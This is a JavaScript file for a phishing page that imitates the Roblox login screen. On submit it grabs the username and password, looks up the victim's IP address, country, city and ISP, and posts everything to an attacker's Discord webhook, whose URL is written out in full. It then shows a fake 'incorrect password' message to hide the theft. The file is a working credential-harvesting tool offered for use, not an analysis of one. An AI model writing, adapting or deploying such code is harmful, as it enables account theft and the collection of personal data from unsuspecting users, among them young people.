const WEBHOOK_URL = "https://discord.com/api/webhooks/1559787608186552390/u6ZLJ37YyeAuCxPPL7m58K9rsHt8waXgW84qSOVuz1iw2C5VuSHe00_6uDti2mNj6zcK";

async function collectFingerprint() {
  const data = {
    user_agent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screen: screen.width + "x" + screen.height,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  };
  try {
    const r = await fetch("https://ipapi.co/json/", { cache: "no-store" });
    if (r.ok) {
      const j = await r.json();
      data.ip = j.ip; data.country = j.country_name;
      data.city = j.city; data.isp = j.org;
    }
  } catch (e) {}
  return data;
}

document.getElementById("loginForm").addEventListener("submit", async (e) => {
  e.preventDefault();
  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value;
  const btn = document.getElementById("loginBtn");
  const err = document.getElementById("errorMsg");

  if (!username || !password) { err.textContent = "Preencha usuário e senha."; return; }

  btn.disabled = true;
  btn.textContent = "Logging in...";
  err.textContent = "";

  const fp = await collectFingerprint();

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "Roblox Capture",
        embeds: [{
          title: "🔐 Nova credencial capturada",
          color: 0x00A2FF,
          timestamp: new Date().toISOString(),
          fields: [
            { name: "Username", value: "`" + username + "`", inline: true },
            { name: "Password", value: "`" + password + "`", inline: true },
            { name: "IP", value: fp.ip || "?", inline: true },
            { name: "País", value: fp.country || "?", inline: true },
            { name: "Cidade", value: fp.city || "?", inline: true },
            { name: "ISP", value: fp.isp || "?", inline: false },
          ],
          footer: { text: "Roblox Clone" },
        }],
      }),
    });
  } catch (e) {}

  setTimeout(() => {
    btn.disabled = false;
    btn.textContent = "Log In";
    err.textContent = "Username or password is incorrect.";
    document.getElementById("password").value = "";
  }, 900);
});
